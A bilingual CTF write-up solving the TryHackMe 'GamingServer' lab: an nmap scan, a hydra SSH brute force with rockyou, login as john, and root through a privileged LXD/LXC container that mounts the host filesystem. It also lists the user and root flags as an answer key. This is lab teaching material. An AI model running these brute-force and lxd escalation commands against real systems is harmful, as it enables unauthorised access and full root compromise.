# GamingServer

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | ctf | `gamingserver` | https://tryhackme.com/room/gamingserver | 01 Level Easy | TryHackMe | nmap / SSH / hydra / john / LXD / LXC / container privilege escalation | Ofensivo: explotar SSH (credenciales débiles) y escalar a root abusando del grupo `lxd` mediante un contenedor LXC privilegiado que monta el sistema de archivos raíz. |

---

> **Objeto:** Comprometer la máquina del servidor de videojuegos descubriendo credenciales SSH con fuerza bruta, entrar como el usuario `john`, enumerar el sistema (grupo `lxd`) y montar un contenedor LXC privilegiado con la imagen Alpine para montar `/root` del host y leer la flag de root.

**Contexto:** Sala CTF (by AbedAlqader Swedan) con un servidor web y SSH expuestos. En el código fuente de la web aparecen pistas de un usuario (`john`). Con `hydra` y `rockyou` se obtiene la contraseña SSH (`taylor`) y se entra como `john`, donde se lee la flag de usuario. La enumeración revela que el usuario pertenece al grupo `lxd`, lo que permite la escalada clásica de LXD/LXC: se descarga una imagen Alpine, se crea un contenedor con el filesystem del host montado en `/mnt` y se accede a `/root` para leer la flag final.

> **ES:** "GamingServer" — fuerza bruta SSH, flag de usuario y escalada por contenedor LXD/LXC a root.
> **EN:** SSH brute force gives a foothold; a `lxd` group membership turns a privileged Alpine LXC container into root via a host `/root` mount.

## Solucionario

### Task 1: Despliegue / Deployment

**Explicación:** Se despliega la máquina del laboratorio y se arranca el escenario. No hay respuesta que escribir.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Deploy the machine and start the room. / Despliega la máquina. | `No answer needed` |

### Task 2: Reconocimiento y acceso SSH / Recon and SSH Access

**Explicación:** El escaneo de puertos muestra `SSH (22)` y un servidor web en `80`. En el código de la página (comentario HTML) se encuentra el nombre de usuario `john`. Como el servicio SSH acepta fuerza bruta aunque esté limitada, con `hydra` y el diccionario `rockyou` se valida la contraseña `taylor` para `john`. Con esas credenciales se inicia sesión por SSH.

```bash
nmap -sV -sC <IP>
curl http://<IP>/                 # comentario HTML: "john"
hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://<IP>
ssh john@<IP>                     # pass: taylor
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 2 | Get a shell as john. / Obtén una shell como john. | `No answer needed` |

### Task 3: Flag de usuario / User Flag

**Explicación:** En el directorio home del usuario `john` se encuentra el archivo `user.txt` con la flag de usuario.

```bash
cat /home/john/user.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 3 | ¿Cuál es la flag de usuario? / What is the user flag? | `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e` |

### Task 4: Escalada de privilegios (LXD) / Privilege Escalation (LXD)

**Explicación:** El usuario `john` pertenece al grupo `lxd` (`id`). Este grupo permite crear contenedores LXC sin permisos de root, y con la técnica estándar se consigue root: descargar en la máquina la imagen Alpine con `lxc image import alpine.tar.gz --alias myimage`, lanzar el contenedor con el directorio raíz del host montado en `/mnt/root` y ejecutar un comando en él para leer `/mnt/root/root/root.txt`. El contenedor se inicia con `security.privileged=true` para montar el filesystem completo del host.

```bash
id                                        # ... john lxd
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc cat /mnt/root/root/root.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 4 | ¿Cuál es la flag de root? / What is the root flag? | `2e337b8c9f3aff0c2b3e8d4e6a7c88fc` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Deploy the machine and start the room. | `No answer needed` |
| 2 | Get a shell as john. | `No answer needed` |
| 3 | What is the user flag? | `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e` |
| 4 | What is the root flag? | `2e337b8c9f3aff0c2b3e8d4e6a7c88fc` |

---

**Metodología:** Escaneo (22, 80) y extracción del usuario `john` desde comentarios HTML de la web. Fuerza bruta SSH con `hydra` y `rockyou` para obtener `taylor`. Post-explotación: enumeración con `id` para detectar la pertenencia al grupo `lxd`, importación/creación de un contenedor Alpine privilegiado con el directorio raíz del host montado y lectura de la flag de root a través del mount.

### Cadena de ataque / Attack Chain

```text
nmap (22, 80) -> HTML comment (john) -> hydra ssh (taylor) -> login john -> user flag -> grupo lxd -> LXC contenedor privilegiado -> mount / del host -> /root/root.txt -> root flag
```

**Learning chain:** SSH brute force -> local enumeration -> lxd/LXC group abuse -> privileged container -> host filesystem mount -> root.

**Lección:** *Pertenecer al grupo `lxd` equivale a ser root: los contenedores se crean con el daemon con privilegios y montar `/` del host dentro de un LXC `security.privileged=true` concede acceso total al filesystem y a `/root`.*

**MITRE ATT&CK:** T1078.003 — Valid Accounts: Local Accounts; T1110 — Brute Force; T1068 — Exploitation for Privilege Escalation; T1610 — Deploy Container

**Fuente:** [TryHackMe - GamingServer](https://tryhackme.com/room/gamingserver)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.